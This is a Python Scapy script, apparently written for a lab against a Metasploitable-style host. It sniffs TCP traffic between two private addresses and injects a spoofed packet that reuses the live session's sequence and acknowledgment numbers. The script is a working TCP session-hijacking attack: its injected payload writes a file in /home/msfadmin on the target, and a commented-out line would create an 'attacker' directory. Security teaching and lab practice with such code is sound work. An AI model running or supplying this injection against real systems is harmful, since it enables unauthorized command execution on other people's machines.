from scapy.all import *

def packet_callback(packet):
    """
    Callback function that processes sniffed packets.
    """
    # Ensure it's a TCP packet with an IP layer
    if packet.haslayer(IP) and packet.haslayer(TCP):
        # Check if the packet source and destination match our criteria
        if packet[IP].src == "192.168.138.215" and packet[IP].dst == "192.168.138.65":
            # Extract details from the packet
            src_ip = "192.168.138.215"  # Source IP address
            dst_ip = "192.168.138.65"  # Destination IP address
            src_port = packet[TCP].sport  # Source port
            dst_port = packet[TCP].dport  # Destination port
            seq_num = packet[TCP].seq # Sequence number
            ack_num = packet[TCP].ack      # Acknowledgment number
            original_flags = packet[TCP].flags

            print(f"[INFO] Sniffed Packet: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
            print(f"Sequence Number: {seq_num}, Acknowledgment Number: {ack_num}")
            
            # Craft a spoofed packet with modified payload
            #spoofed_payload = "\n mkdir /home/msfadmin/attacker \n"
            spoofed_payload = "echo hello > /home/msfadmin/testfile\n"



            ip_layer = IP(src=src_ip, dst=dst_ip)
            tcp_layer = TCP(sport=src_port, dport=dst_port, seq=seq_num, ack=ack_num, flags=original_flags)
            spoofed_packet = ip_layer / tcp_layer / spoofed_payload
            
            print("[INFO] Sending spoofed packet...")
            send(spoofed_packet, verbose=0)
            print("[INFO] Spoofed packet sent successfully!")
            
            # Stop sniffing after the first packet
            return True

print("[INFO] Sniffing for TCP packets...")
# Start sniffing on the network interface (replace 'eth0' with your active interface)
while True:
    sniff(filter="tcp", prn=packet_callback, store=0, count=1)
